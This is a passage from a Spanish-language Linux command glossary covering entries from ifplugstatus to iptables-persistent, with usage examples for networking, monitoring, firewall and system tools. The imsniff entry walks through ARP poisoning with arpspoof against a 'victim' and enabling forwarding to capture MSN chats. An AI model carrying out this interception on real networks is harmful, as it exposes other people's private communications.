Es un demonio que configura automáticamente un dispositivo ethernet cuando se conecta un cable y lo desconfigura automáticamente si se extrae el cable.
# ifplugstatus


ifplugstatus
[ifplugd]. Indica todos los dispositivos conectados al pc.
# ifplugstatus (de todos)
# ifplugstatus eth0 (el especificado)


ifquery
Lista rápida de interfaces de red.
$ ifquery -l (Muestra las especificadas en /etc/network/interfaces y el orden en que se levantarán)
$ ifquery --state (Muestra el orden en que se levantaron según /run/network/ifstate)
$ ifquery enp1s0 (muestra información de la interface especificada)


ifrename
Permite al usuario decidir qué nombre tendrá una interfaz de red.
# ifrename -i eth0 -n Nuevo_nombre


ifs
Internal Field Separator (separador de campos internos) sirve para indicar cual es el valor que se usa como separador. Si no se especifica ninguno es el espacio.
Algunos ejemplos:
1.-
	#!/bin/bash
	# dividir una IP en 4 variables
	# Guardar el separador de campos original
	OLDIFS=$IFS
	read -p "Dime la ip: " IP
	# Establecemos el separador de campos en el punto
	IFS=.
	read IP1 IP2 IP3 IP4 <<< "$IP"
	echo "$IP1 $IP2 $IP3 $IP4"
	# Restablecemos el separador original (El espacio)
	IFS=$OLDIFS
2.-
	#!/bin/bash
	#Almacenamos el valor original de la variable IFS
	OLDIFS=$IFS
	#Cambiamos el valor del IFS a final de linea [\n]
	IFS=$'\n'
	for line in $(cat file.txt)
	do
		echo $line
	done
	#Restauramos el IFS
	IFS=$OLDIFS


ifstat
Monitorización del trafico de red.
$ ifstat -z (Descarta los interfaces sin actividad)
$ ifstat -i eth1 (Especificando una red)
Algunas opciones:
-a (Muestra todas las redes)
-T (monitorizando varias redes, muestra el total)
-S (Muestra los resultados en la misma linea, si es posible)
-b (Reporta los informes en Kbits / seg en lugar de kbytes / seg.)


iftop
Muestra el ancho de banda que está usando una red.
# iftop -nP -i eth0 (sin resolver las IPs[n], mostrando puerto[P] y especificando red)


ifup
[ifupdown]. Habilita la interfase especificada:
$ ifup eth0
$ ifup -a (levanta las especificadas en /etc/network/interfaces)


imageindex
Generar una galerías de imágenes en HTML estáticas de un directorio. Se generan miniaturas y puede personalizarse con hojas de css. Crear el archivo .imageindexrc
$ nano .imageindexrc
con un contenido que puede personalizarse como indica su página man:
	$framedateformat = "%D";
	$frametimeformat = "%R";
	$indexdateformat = "%D";
	$indextimeformat = "%R";
	$slidedateformat = "%D";
	$slidetimeformat = "%R";
	$detaildateformat = "%m/%y";
	$default_titletext  = "Directorio de imágenes";
	$indexlinktext = "indice";
	$detaillinktext = "detalles";
	$framelinktext = "slideshow view (frames)";
	$stylesheet = '
            body { color: black; background: gray; }
	'
Algunas notas al respecto:
	%D (que las fechas sean dia, mes, año)
	%R (horas y minutos)
	$default_titletext (el título)
	$indexlinltext (en castellano)
	$detaillinktext (en castellano)
	$stylesheet (el fondo [background] gris. colocar otros ajustes entre los apóstrofes)
Entrar en el directorio donde estan las imagenes y lanzar:
$ imageindex (Crea los archivos y el index.html)
Visualizar el index.html creado en el navegador.


imagemagick
Paquete de software que se utiliza para editar y manipular imágenes digitales. Se puede utilizar para crear, editar, componer o convertir imágenes y admite una amplia gama de formatos de archivo: JPEG, PNG, GIF, TIFF,  PDF... Incluye varias aplicaciones: animate, compare, composite, conjure, convert, display, identify, import, mogrify, montage y stream


img2txt
[caca-utils, libcaca]. Pasar una imagen a ascii.
$ img2txt imagen.png (forma básica)
$ img2txt -f svg imagen.jpg > imagen.svg
$ img2txt -f html imagen.jpg > imagen.html (código html de la imagen)


import
[imagemagick]. Capturar la pantalla en cualquier formato.
$ import -window root captura.png (captura de pantalla completa)
$ import -window `xwininfo | awk '/Window id/{print $4; exit}'` `uuidgen`.png (Lo mismo. El puntero se convierte en una cruz y captura el escritorio donde se clica)
$ import -frame -strip -quality 75 "$HOME/$(date +%s).png" (seleccionar el trozo a capturar)
$ import captura.png (captura de un área concreta))
$ import 2 captura.png (realizar 2 capturas)
$ import -pause 5 captura.png (Para retardar la captura 5 segundos)
$ import -geometry 250×250! captura.png (indicando un tamaño respetando las proporciones)


impressive
Visualizar documentos PDF e imágenes (jpg, tiff, png...)
$ impressive archivo.pdf (uso basico)
$ impressive -f -g 800x600 archivo.pdf (Sólo ocupando una ventana de la pantalla
$ impressive -f -g 800x600 *.jpge todos los jpg del directorio)
$ impressive -a 5 -w archivo.pdf (5 segundos por diapositiva y reiniciando la presentación cuando termine)
$ impressive -i 10 archivo.pdf (empezando en la página 10)
$ impressive --invert archivo.pdf (invirtiendo los colores existentes en el pdf)
$ impressive -p 10-12 archivo.pdf (Sólo mostrar de las páginas 10 a la 12)
$ impressive -l (lista efectos disponibles)
$ impressive -t SqueezeLeft documento.pdf
Algunas opciones:
AvPág (Va a la página siguiente)
RePág (Va a la página anterior)
z (zoom donde esté el cursor)
f (Activa/Desactiva la pantalla completa)
tab (mostrar miniaturas)
q (Salir de la aplicación)


imsniff
Capturar paquetes relacionados con el protocolo MSN . Su uso pasa por el envenenamiento arp, situando nuestra máquina entre la victima y el router lanzando en varias terminales y sin cerrarlas:
# arpspoof -i eth0 -t 192.168.1.15 192.168.1.1
# arpspoof -i eth0 -t 192.168.1.1 192.168.1.15
Activar forwarding para que los paquetes vayan a su verdadero dueño:
# echo 1 > /proc/sys/net/ipv4/ip_forward
Crear una carpeta donde guardar los datos:
$ mkdir snifadas
Modificar el archivo de configuración a partir de la  propia documentación ::
# cp /usr/share/doc/imsniff/examples/imsniff.conf.sample /etc/imsniff.conf
# nano /etc/imsniff.conf
daemonize = 0
promisc = 0
verbose = 2
chatdir = /home/USER/snifadas/chats
debugdir = /home/USER/snifadas/debug
interface eth0
Los directorios "chats" y "debug" los crea la misma aplicación.
Lanzar el sniffer de conversaciones msn:
# imsniff


imv
[renameutils]. Permite renombrar interactivamente los nombres de los archivos uno por uno.
$ imv dir/archivo.txt


inadyn
Cliente que actualiza registros DNS de ips dinámicas tipo noip2 [ver].
# nano /etc/inadyn.conf
Y, para el caso de un registro no-ip, modificar los parámetros:
	system default@no-ip.com
	username Nombre_de_registro_en_no-ip
	password Contraseña_del_registro_de_no-ip
	alias Tu_host.no-ip.org
El periodo de actualización en segundos:
	period 600
Si existen errores se mostrarán la lanzar:
# inadyn


incron
Monitorizar los cambios realizados en un directorio del sistema lo cual se refleja en /var/log/messages [tail -f /var/log/messages]. La configuración global y el monitoreo se realiza en /etc/incron.conf. Igual que con crontab [ver] puede abrirse como usuario normal o root [crontab -e]. Para arrancar el servicio:
# service incron start
Añadir las lineas de los archivos o directorios a monitorizar según los ejemplos siguientes en /etc/incron.conf
	/home/USER/dir1 IN_MODIFY echo "$$ $@ $# $% $&" (datos ha indicar si se modifica dir1)
	/etc/apache2/apache2.conf IN_MODIFY /usr/sbin/service apache2 stop (si se modifica apache2.conf parar el servicio)
	/home/USER/Documentos IN_ACCESS,IN_OPEN mplayer /home/USER/musica/cancion.mp3 (reproducir mp3 si alguien accede a un directorio)
	/var/www/html IN_CREATE script_backup.sh (ejecutar un script si se crea un nuevo archivo o directorio en html)
	/home/USER/emacs_tut.txt IN_MODIFY echo "$$ $@ $# $% $&" (si se ha modificado un fichero)
Opciones de monitoreo de los archivos o directorios:
    IN_ACCESS - Si se accedió a él.
    IN_ATTRIB - Si se actualizó información.
    IN_CLOSE_WRITE - Si se abrió para escritura y fue cerrado.
    IN_CLOSE_NOWRITE - Archivo abierto fue cerrado.
    IN_CREATE - Si se creo algún archivo o directorio.
    IN_DELETE - Si se borró algún archivo o directorio.
    IN_DELETE_SELF - Si se ha eliminado el archivo o el directorio.
    IN_MODIFY - Si un archivo fue modificado.
    IN_MOVE_SELF - Si se ha movido el archivo o el directorio.
    IN_MOVED_FROM - Si se movio algún archivo de este directorio a otro.
    IN_MOVED_TO - Si se movió algún archivo de otro directorio al presente
    IN_OPEN - Si un archivo fue abierto.
    IN_ALL_EVENTS - Todos los eventos anteriores.
Significados de algunos datos que pueden incorporarse en el informe en /var/log/messages:
	$$ (Imprimir un signo de dólar literalmente)
	$@ (Agregar la ruta del sistema de archivos supervisados)
	$# (Agregar el nombre del archivo)
	$% (Agregar indicadores de eventos)


inetutils-traceroute
La utilidad traceroute [ver] muestra la ruta tomada por los paquetes IP en su camino a otro host u otra red. Esta herramienta permite examinar la conectividad de red o para diagnosticar problemas de red.
$ inetutils-traceroute --resolve-hostnames lapipaplena.org (resolviendo los hostnames de la ruta)


info
Páginas de manual para la mayoria de programas del proyecto GNU con una estructura jerarquizada. Ligeramente más complejo que las clásicas páginas man  [ver]
$ info (MUestra la lista de los nodos disponibles en el primer nivel)
$ info ifconfig


info2man
Generar páginas de manual a partir de documentos de información como los que se almacenan en /usr/share/info. Incluye la aplicación info2pod [Plain Old Documentation].
$ info2pod /usr/share/info/nano.info.gz > nano.txt
$ info2man /usr/share/info/nano.info.gz > nano.txt


infocmp
Herramienta que se utiliza para comparar o mostrar información sobre descripciones de terminal en sistemas que utilizan el sistema de gestión de terminales terminfo.
$ infocmp (muestra la descripción completa de la terminal actual)
$ infocmp xterm (mostrar información sobre el tipo de terminal xterm)
$ infocmp aterm xterm (Comparar dos descripciones de terminal)
$ infocmp -L > infor.txt (convertir y mostrar la descripción en formato de texto legible y mandarlo a un archivo)


init
Para o reinicia el sistema
$ init 0    (para)
$ init 1    (reinicia en modo  uniusuario)
$ init 6    (reinicia)


initramfs
Problemas durante el arranque. Consiste en un fallo de lectura de los controladores ide de discos duros por parte del kernel del sistema operativo que no logra reconocer dichos drivers. Arrancar con un livecd o pulsando “e” para editar la opción cuando salga el menu en grub:
# gedit /boot/grub/menu.lst
Y al final de la linea del kernel poner: rootdelay=90
Otras soluciones propuestas (sustituir el rootdelay=90 por):
pci=nomsi
all_generix_ide
Para actualizar initramfs y que el kernel aplique los cambios:
# update-initramfs -u


inittab
Fichero que gestiona el inicio del sistema o un cambio de estado (runlevel) con el comando init (ver).
# nano /etc/inittab
Especificación de si el sistema arranca en modo monousuario (1) o multiusuario (2-5). Por defecto 2 o 3:
	id:2:initdefault:
Scripts que se ejecutarán en el inicio y en el orden que lo harán independientemente del runlevel:
	si::sysinit:/etc/init.d/rcS (En algunas distros si::sysinit:/etc/rc.d/rc.sysinit)
Este script llama a los scripts del directorio /etc/rcS.d. Por cada runlevel se ejecutan los scripts del directorio correpondiente: rc0.d/, rc1.d/, rc2.d/, rc3.d/, rc4.d/, rc5.d/, rc6.d/, rc.local y rcS.d/. El directorio /etc/rc.local se usa para ejecutar servicios porpios del usuario. En estos directorios los scripts que empiezan por una "K" paran servicios y los que empiezan por una "S" los arrancan.
Qué hacer si se presiona CTRL-ALT-DEL:
	ca:12345:ctrlaltdel:/sbin/shutdown -t1 -a -r now
Qué hacer si la corriente se va/vuelve
	pf::powerwait:/etc/init.d/powerfail start
	pn::powerfailnow:/etc/init.d/powerfail now
	po::powerokwait:/etc/init.d/powerfail stop
Despues de ejecutar los scripts de inicio, init crea un conjunto de terminales virtuales:
	1:2345:respawn:/sbin/getty 38400 tty1
	2:23:respawn:/sbin/getty 38400 tty2
	3:23:respawn:/sbin/getty 38400 tty3
	4:23:respawn:/sbin/getty 38400 tty4
	5:23:respawn:/sbin/getty 38400 tty5
	6:23:respawn:/sbin/getty 38400 tty6
Utilizando la opción respawn, si alguien trata de finalizar uno de estos procesos, el proceso simplemente será regenerado (respawned).
1.-
Entrar de forma automática:
Comentar la siguiente línea
#1:2345:respawn:/sbin/getty 38400 tty1
Y Agrega la siguiente linea:
1:2345:respawn:/bin/login -f USUARIO tty1 </dev/tty1 >/dev/tty1 2>&1
Siendo USUARIO el nombre de usuario que hará login automático.


innotop
Monitorización del servidor de bases de datos mysql.
$ innotop -u USER -p PASS -h localhost -P 3306
Nota.- Pulsar "q" para salir.


inputrc
(archivo /etc/inputrc y ~/.inputrc). Librería readline que permite editar líneas de texto usando los modos de emacs y vi. Esto permite estandarizar las combinaciones de teclas entre muchos comandos.
$ nano .inputrc
Ajustes que pueden añadirse al archivo personal.
1.-
Que al pulsar Ctrl+x Ctrl+f liste las funciones y con Ctrl+x Ctrl+v las variables:
# Lista las funciones y variables de readline
"\C-x\C-f": dump-functions
"\C-x\C-v": dump-variables
2.-
Que el autocompletado con la tecla "tab" no distinga mayúsculas y minúsculas:
# Ignora diferencias de mayusculas/minusculas al
# completar con tabulador
set completion-ignore-case on


insmod
Carga modulos.
# insmod mudulo


install-mbr
Instala un nuevo código MBR al inicio del disco duro.
# install-mbr /dev/sda (instala)
# install-mbr -l /dev/sda (muestra información del código mbr)


installkernel
Instala una nueva imagen del kernel en el sistema desde el árbol de fuentes de Linux. Es llamado por los makefiles del núcleo de Linux cuando make install es invocado. El nuevo núcleo se instala en /boot/vmlinuz-{version}. Si ya existe un enlace simbólico /boot/vmlinuz, se actualiza haciendo un enlace desde /boot/vmlinuz al nuevo núcleo y el núcleo previamente instalado está disponible como /boot/vmlinuz.old. installkernel se instala en /sbin porque los makefiles del núcleo de Linux lo llaman allí y no en /usr/sbin.


instmodsh
Para conocer los módulos perl instalados. Entra en el prompt (cmd?) con 3 preguntas:
l (List all installed modules)
m <module> (Select a module)
q (Quit the program)


integrit
Detectar cuando algún archivo del sistema ha sido alterado mediante la creación, la primera vez que se lanza, de una base de datos con la que confrontar los nuevos escaneos.
Configuración:
# /etc/integrit/integrit.con
Descomentar las lineas:
	root=/
	known=/var/lib/integrit/known.cdb
	current=/var/lib/integrit/current.cdb
Y descartar los directorios que no se deseen incluir en el escaneo, descomentandolos ["cdrom" se descarta, "/dev" se escane, "/usr/src" no se escaneará de forma recursiva ]:
	!/cdrom
	# !/dev
	=/usr/src
Crear la base de datos inicial:
# integrit -u -C /etc/integrit/integrit.conf
Mover la base de datos a know.cdb:
# mv /var/lib/integrit/current.cdb /var/lib/integrit/known.cdb
Lanzar la comprobación:
# integrit -C /etc/integrit/integrit.conf -c
Si queremos colocar la orden en el cron para ser lanzada cada hora y que envie un correo al administrador:
# crontab -e
Y colocamos la linea:
	* 1 * * * integrit -C /etc/integrit/integrit.conf -c | mail root


interfaces
[/etc/network/interfaces]
Archivo de configuración de la red en distros debian.
1.-
Con IP dinámica:
Colocar en el archivo las lineas:
	auto eth0
	iface eth0 inet dhcp
2.-
Con IP fija
Colocar en el archivo las lineas:
	auto eth0
	iface eth0 inet static
	address 192.168.1.10
	gateway 192.168.1.1
	netmask 255.255.255.0
	broadcast 192.168.1.255
Reiniciar el servicio:
# ifdown eth0
# ifup eth0
Nota.- Solo modificandolo en network-manager no funciona.
3.-
Creación de una segunda dirección IP virtual.
Añadir las siguientes lineas a las de la IP fija:
	auto eth0:1
	iface eth0:1 inet static
	address 192.168.0.15
	netmask 255.255.255.0
	broadcast 192.168.0.255
	gateway 192.168.0.1
Nota.- La instalación de nerwork-manager o wicd para la gestión de redes implica comentar las modificaciones de este archivo o en, en el caso de network-manager, editar:
# nano  /etc/NetworkManager/NetworkManager.conf
Y modificar la linea:
	[ifupdown]
	managed=true
4.-
Obtener el módulo que usa una determinada interfaz de red:
# ls /sys/class/net/ (Listar todas las interfaces de red del equipo)
# ls -la /sys/class/net/eth1/device/driver (Ver el módulo del kernel que está usando una interfaz de red)


inxi
Muestra información del equipo (<http://inxi.googlecode.com/svn/trunk/inxi>).
$ inxi -Fpur -c 4
Algunas opciones (con inxi -h la lista completa):
	-A (Audio y tarjetas de sonido)
	-b (informacio básica)
	-c (formato de color de 0 a 32 para la salida de datos)
	-C (CPUs)
	-d (drivers opticos)
	-D (disco duro)
	-F (salida extendida)
	-G (tarjeta gráfica)
	-i (Información de red)
	-I (Procesos, uptime, memoria...)
	-M (Datos de la máquina)
	-N (	tarjetas de red)
	-o (particiones no montadas)
	-p (particiones montadas)
	-r (repositorios)
	-s (sensors[temperaturas cpu])
	-S 	(Host, Kernel,Escritorio y Distro)
	-t cm (Procesos que consumen más cpu [c] y memoria [m])
	-u (UUID de las particiones. -uo las no montadas, -up las montadas)
	-v 6 (Distintas etiquetas de información. Del 1 al 6)


ionice
El programa establece u obtiene la clase de programación de I/O y su prioridad. Si no se dan argumentos o solo "-p", ionice consultará la clase de programación de E/S actual y la prioridad para ese proceso. Si no se especifica ninguna clase, el comando se ejecutará con la clase de programación de "mejor esfuerzo". El nivel de prioridad predeterminado es 4.
$ ionice -c 3 -p 103 (Establece el proceso con PID 103 como un proceso de I/O inactivo [-c 3, 0 para ninguno, 1 para tiempo real y 2 para el mejor esfuerzo])
$ ionice -c 3 ls (el comando "ls" se lanzará con proceso I/O inactivo)
$ ionice -c 2 -n 0 bash (Ejecuta 'bash' como un programa de mejor esfuerzo con la máxima prioridad [-n 0, de 0 a 7, siendo 7 el de menos prioridad])
$ ionice -p 103 145 173 (Imprime la clase y prioridad de los procesos con PID 103, 145 y 173)
# ionice -c3 -p `pidof sshd` (reinicar un servicio dandole un PID)


ioping
Supervisa la latencia del disco en tiempo real. La idea principal detrás de ioping es tener una utilidad similar al ping, que mostrará la latencia del disco de la misma manera que ping muestra la latencia de la red.
$ ioping -i 2 -c 5 / (medir la latencia del disco duro en un periodo de 5 veces con 2 segundos de separación)
$ ioping -c 10 -s 1M /tmp (Medir la latencia en /tmp utilizando 10 solicitudes de 1 megabyte cada una)
$ ioping -RL /dev/sda (Medir la velocidad secuencial del disco)


iostat
muestra estadísticas de la CPU y de la entrada y salida de los dispositivos y particiones.
$ iostat -x sda -d 1 6 (6 reportes con 1 segundo de intervalo sobre el disco sda. Suprimiendo la última cifra [6] continuará reportando datos hasta finalizar con Ctrl+c)
$ iostat -d 3 (actualizará resultados cada 3 segundos)
$ iostat -p sda (Ver estadisticas de un disco concreto con sus particiones)


iotop
monitoriza el ratio de lectura/escritura en disco .
$ iotop -o -u usuario
$ iotop -a -p $(sed 's, , -p ,g' <<<`pgrep "_raid|_resync|jbd2"`) (un raid)
Alguns opciones:
-d 2 (Actualización cada 2 segundos)
-b (No interactivo)
-o (Sólo mostrar procesos que hacen uso de entrada/salida)
-t (Incluir una marca de tiempo)
-p pid (Pid del proceso a monitorizar. Por defecto todos)
-u usuario (especificando usuario)


iozone
Realizar test de velocidad de sistemas de archivos (ext3, ext4...)
$ iozone -s 2g -r 64 -i 0 -i 1 -b test.xls
$ iozone -a -g 2G -f /media/sda2
-a (automático)
-g (Tamaño de los archivos generados)
-f (el sistema de archivos a tratar)
-i (0= escritura, 1= lectura, 2=lectura/escritura....)
-b (archivo que generará con los resultados)


ip
[iproute2]. Configuración de red. Muestra dispositivos, enrutamientos, tuneles.
$ ip addr (Revisar tarjetas)
$ ip route show (Información)
$ ip link show (Ver interfaces de red)
$ ip link set dev eth0 down (bajar una red)
$ ip route add default via 192.168.1.1 (establecer la ip del router)
$ ip link set dev eth0 up (levantar una red)
$ ip addr add 192.168.1.20 255.255.255.0 dev eth1 (establecer una ip estática)
$ ip addr del 192.168.1.55/24 dev eth0 (bajar una ip)
$ ip n  (MAC e IP del router)
$ ip link set dev eth1 address 00:03:44:88:00:11 (Modificdar la MAC. Previamente bajar la red)
$ ip route del default (Eliminar puerta de enlace para crear una nueva)
$ ip route add default via 192.168.1.10 (Crear nueva puerta de enlace)
$ ip route add 192.168.1.53 via 192.168.0.33 (redirigir un pc a otro)
$ ip route add 192.168.1.0/24 via 192.168.0.33 (redirigir una red a un pc)
$ ip -f inet addr show eth0 (información de la dirección ip)
$ ip route add 192.168.2.0/24 via 192.168.1.10 (Añadir una red a una puerta de enlace)
Nota.- Verificar que /etc/resolv contenga una linea con el servidor DNS tipo: nameserver 8.8.8.8 [para las DNS de google] o la 127.0.0.1


ip2host
Resuelve las direcciones IP a los nombres de host en los registros del servidor web.
# ip2host < /var/log/apache2/error.log > logs.txt


ip-ajustes
1.- Estática
# gedit /etc/network/interfaces
	auto eth0
	iface eth0 inet static
	address 192.168.x.x
	netmask 255.255.255.0
	network 192.168.x.0
	boadcast 192.168.2.255
	gateway 192.168.x.1
# /etc/init.d/networking restart (reiniciar el servicio)
$ ip a (verificar la nueva ip)


ipband
Mostrar datos de la conexión. Copiar el arxivo de configuración:
# cp /usr/share/doc/ipband/examples/ipband.conf-simple /etc/ipband.conf
Y descomentar o modificar los siguientes parámetros:
	debug 0
	interface eth1
	fork yes
	htmlfile /srv/www/htdocs/ipbandwidth/index.html
	htmltitle Consumo de banda
	average 10
	accumulate no
	maskbits 32
	localrange 192.168.1.0/24
Reiniciar el servicio:
# /etc/init.d/ipband restart
Arrancar la aplicación:
# ipband
Los informes se muestran poniendo en la barra del navegador: http://localhost/html/ipbandwidth/index.html


ipcalc
Se utiliza para realizar cálculos relacionados con direcciones IP y subredes. Permite obtener información útil como la dirección de red, la máscara de red, el rango de hosts y más. Originalmente, ipcalc estaba pensado para usarse desde el indicador de shell, pero se proporciona un contenedor CGI para permitir la visualización de HTML colorido a través de un servidor web. Puede encontrarlo en el directorio /usr/share/doc/ipcalc/examples.
# ipcalc 192.168.1.10 255.255.255.0 (información básica de una dirección IP y máscara de red)
# ipcalc 192.168.18.4/24 (usando notación CIDR en la cual la cantidad de bits de la máscara de red  es /24 equivalente a 255.255.255.0)
# ipcalc -c 192.168.1.50 192.168.1.0/24 (verificar si una IP pertenece a una subred)
# ipcalc -b 192.168.1.10/24 (solo mostrar información esencial)
# ipcalc 10.0.0.0/16 (mostrar el rango de hosts disponibles en una subred)


ipcrm
Permite eliminar la comunicación entre procesos [ver ipcs]. Si paramos el programa con un Ctrl-C o simplemente sale de forma anormal, el recurso [la memoria compartida] no se libera y queda en el sistema. Con este comando es posible borrarla.
# ipcrm -m 950288 (eliminar un segmento de memoria compartida)


ipcs
Informa sobre la comunicación entre procesos [espacios de memoria, buffers, semaforos..] listando los recursos compartidos que están creados en ese momento. Ver ipcrm. La columna "shmid" muestra el ID, la "owner" el propietario, "perms" los permisos y "bytes" el tamaño en bytes
# ipcs -s | grep postgres  (Muestra los recursos compartidos de postgres)
# ipcs -lm (determinar los limites de memoria compartida del sistema)
# ipcs -ls (Límites actuales del contador que se utiliza para acceder a los recursos compartidos del sistema)
# ipcs -u  (Proporciona información sobre la comunicación entre procesos)
# ipcs -m (despliega los segmentos de memoria compartida)
# ipcs -mu (muestra un breve resumen)
# ipcs -ml (muestra los límites en contraposición a los valores actuales)
# ipcs -m -i 950288 (obtener detalle de un segmento de memoria compartida [valor shmid])
# ipcs -s (Muestra los semforos en el sistema)
Algunas opciones:
-m  (segmentos de memoria compartida )
-q   (colas de mensajes )
-s   (matrices de semáforos )
-a   (todos. Opción por defecto)
-p   (pid)


iperf
Para poder verificar el ancho de banda entre los clientes de una red local. Se instala en todas las máquinas de la red.
# iperf -s (Poner el servidor a la escucha por el puerto 5001)
# iperf -c 192.168.1.10 (Conectar los clientes con el servidor)
Alguna sopciones que pueden añadirse:
-f B (Mostrar el resultado en Bytes por segundo [b: bytes/s, k:kilobits/s, m:megabytes/s, B:Bytes/s, K:KiloBytes/s, M:MegaBytes/s] esta opción sirva igual para el cliente que para el servidor)
-t 120 (Tiempo en segundos de duración de la transmisión. Sólo para el cliente)
-D (Lanzarlo como servicio. Sólo en el servidor)
-i 10 (Tempo en segundos entre mediciones. Sólo cliente)


ipfm
Cuenta la cantidad de datos enviados y recibidos por hosts específicos a través de un enlace de Internet. Antes de iniciar el servicio, en el archivo de configuración:
# nano /etc/ipfm.conf
Comentar la linea:
         #DISABLED
Los informes en el navegador con la dirección file:///var/log/ipfm/
# ipfm (arrancar el servicio)


ipgeolocation
Obtener geolocalización de una ip o un dominio. Descarga: <https://github.com/maldevel/IPGeoLocation>
$ ./ipgeolocation.py -m (De la propia ip)
$ ./ipgeolocation.py -t 216.58.210.131 (De una ip)
$ ./ipgeolocation.py -t google.es (De un dominio)
$ ./ipgeolocation.py -t microsoft.com -u "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" (Con un Use Agent personalizado)
$ ./ipgeolocation.py -t debian.com -g (Obtener la geolocalización de una ip y abrir la localización en Google Maps a través del navegador por defecto)
$ ./ipgeolocation.py -t lapipaplena.org --csv /consulta.csv (Exportando los datos a un fichero .csv)
$ ./ipgeolocation.py -t lapipaplena.org -e /consulta.txt (Exportando los datos a un fichero .txt)
$ ./ipgeolocation.py -T objetivos.txt (De una lista a raiz de una ip o dominio por linea)


ipmitool
[openipmi]. Obtener datos del estado de un servidor [que lo soporte] tanto en local desde el propio servidor cómo en remoto. Se trata de un chipset que permite obtener información del estado de diferentes componentes hardware, temperaturas, voltajes, etc... Primero habilitar el demon ipmievd:
# nano /etc/default/ipmievd
Y modificar la linea:
ENABLED=true
En algunas distros es preciso cargar los módulos:
	# ipmi_msghandler
	# ipmi_si
	# ipmi_devintf
	# ipmi_watchdog
	# ipmi_poweroff
# /etc/init.d/ipmi start (Arrancar el servicio)
# ipmitool sensor get "Ambient Temp" (Consulta de la temperatura ambiente)
# ipmitool user list (Listado de usuarios configurados)
# ipmitool -I lan -H 192.168.1.5 -U usuario sel elist (Litar los logs del sistema)
# ipmitool -H 192.168.1.10 -U usuario -P contraseña chassis status (Estado de chasis remoto)
# ipmitool sdr type Temperature (Obtener la temperatura)


ippfind
Encuentra servicios registrados o dispositivos disponibles a través de dispositivos locales. Su propósito principal es encontrar impresoras IPP y mostrar sus URI, mostrar su estado actual o ejecutar comandos.
$ ippfind -l (Enumera los atributos devueltos por Get-Printer-Attributes para impresoras IPP)
$ ippfind -p (imprimir la dirección de la URI)


ipptool
Envía solicitudes IPP arbitrarias a un servidor o a una impresora IPP. Cada archivo de prueba con nombre define una o más solicitudes, incluido el estado de respuesta, los atributos y los valores esperados. La salida es un informe de texto sin formato, texto formateado, CSV o XML en la salida estándar, con un estado de salida distinto de cero indica que una o más pruebas han fallado. ipptool y se puede utilizar para enviar solicitudes IPP arbitrarias a un servidor CUPS o una impresora IPP.
$ ipptool -t -v -f test ipp://localhost:631/printers/HP_psc_1100_series text.txt (informe de prueba CUPS [-t], atributos de solicitud y respuesta en modo de prueba CUPS [-v] y nombre de archivo de solicitud predeterminado para las pruebas [-f])


ips
Programa tipo ps que muestra los estados de los procesos obtenidos en el archivos /proc. Tiene funciones para facilitar el seguimiento de procesos activos, semiactivos y transitorios.
$ ips


ipscan
Escanea la red en busca de máquinas activas.
$ ipscan -s -f:range 192.168.1.1 192.168.1.255 (todo el rango de ips)
$ ipscan -s -f:file ips.txt (Las especificadas en el archivo ips.txt [una por linea])
$ ipscan -s -f:range 192.168.1.9 192.168.1.16 -o resultat.txt (Derivando el resultado a un archivo)


iptables
[= ip6tables]. Herramienta de cortafuegos y trafico de red.
Algunos ejemplos generales:
	# iptables -F (eliminar todas las reglas)
	# iptables -L (si está activo y con qué reglas)
	# iptables -L -vn (mostrando los puertos e información detallada)
	# iptables -S (mostrar todas las reglas)
	# iptables -L -t nat (Listar reglas de una tabla concreta)
	# iptables -L fail2ban-ssh (comprobar las ips bloqueadas por fail2ban)
	# iptables -D fail2ban-ssh 1 (Quitar la primera ip baneada de las ips bloqueadas)
	# iptables -nL --line-numbers (muestra el orden de ejecución de las reglas)
	# iptables -nL INPUT (Lista todas las reglas de entrada)
	# iptables -nL FORWARD (Lista todas las reglas de salida)
	# iptables -D INPUT 3 (borrar la regla número 3)
	# iptables -A INPUT -j LOG (Guardar logs de todos los bloqueos)
Bloquear (DROP)
	# iptables -P INPUT DROP (Bloquear todo lo que entra)
	# iptables -A INPUT -s IP -j DROP (una ip)
	# iptables -A INPUT -s IP -i eth0 -j DROP (una ip de una red)
	# iptables -A INPUT -s IP -p tcp -dport 22 -j DROP (un puerto de una ip)
	# iptables -A INPUT -s 192.168.1.0/24 -j DROP (una red)
	# iptables -A INPUT -m mac --mac-source 00:11:22:33:44:55 -j DROP (una mac)
	# iptables -A INPUT -p tcp --destination-port 21 -j DROP (puerto 21 de entrada)
	# iptables -A INPUT -p tcp -s IP --destination-port 21 -j DROP (el puerto 21 de entrada sólo para una IP)
	# iptables -A INPUT -p tcp -i eth0 -m multiport --destination-port 22,80,443 -j ACCEPT (Varios puertos)
	# iptables -A INPUT p tcp -s 192.168.1.0/24 --destination-port 21 -j DROP (el  puerto 21 de entrada para todo un rango de IPs)
	# iptables -A FORWARD -p tcp --dport 25 -j DROP (la salida del puerto 25)
	# iptables -A INPUT -p tcp --dport 22 -j LOG --log-prefix "Puerto 22 bloqueado" iptables -A INPUT -p tcp --dport 22 -j DROP (haciendo aparecer una mensaje informando del bloqueo)
Permitir (ACCEPT)
	# iptables -I INPUT 3 -s 192.168.1.0/8 -j ACCEPT (a la red especificada y poner la regla en tercer lugar)
	# iptables -D INPUT -s 192.168.1.0/8 -j ACCEPT (Quitar la regla anterior)
	# iptables -A INPUT -i lo -p all -j ACCEPT (todas las entradas a localhost)
	# iptables -A OUTPUT -o lo -p all -j ACCEPT (todas las salidas a localhost)
	# iptables -A INPUT -p tcp --dport ssh -j ACCEPT (Un servicio concreto)
	# iptables -A INPUT -p tcp -i eth0 -m multiport --destination-port 22,80,443 -j ACCEPT (Todas las entradas a varios puertos)
	# iptables -A OUTPUT -o eth0 -p tcp -d 192.168.101.0/24 --dport 22 -j ACCEPT  (Permitir trafico ssh saliente para la red especificada)
1.-
Salvar las reglas de iptables y restablecerlas manualmente:
# iptables-save  > /etc/iptables.rules
# iptables-restore < /etc/iptables.rules
Si se quiere añadir reglas a las existentes:
# iptables-save -c > /etc/iptables.rules


iptables-persistent
Otra forma de guardas reglas de iptables. Al instalar el paquete pregunta por guardar las reglas existentes, las cuales se guardan en /etc/iptables/rules.v4 y /etc/iptables/rules.v6 [versión más actual de ip6tables]. Si modificamos, añadimos o suprimimos reglas podemos, para volver a guardarlas lanzando:
# dpkg-reconfigure iptables-persistent
En realidad este paquete lo que hace es:
# iptables-save > /etc/iptables/rules.v4
# ip6tables-save > /etc/iptables/rules.v6
Y para restituirlas despues de un reinicio:
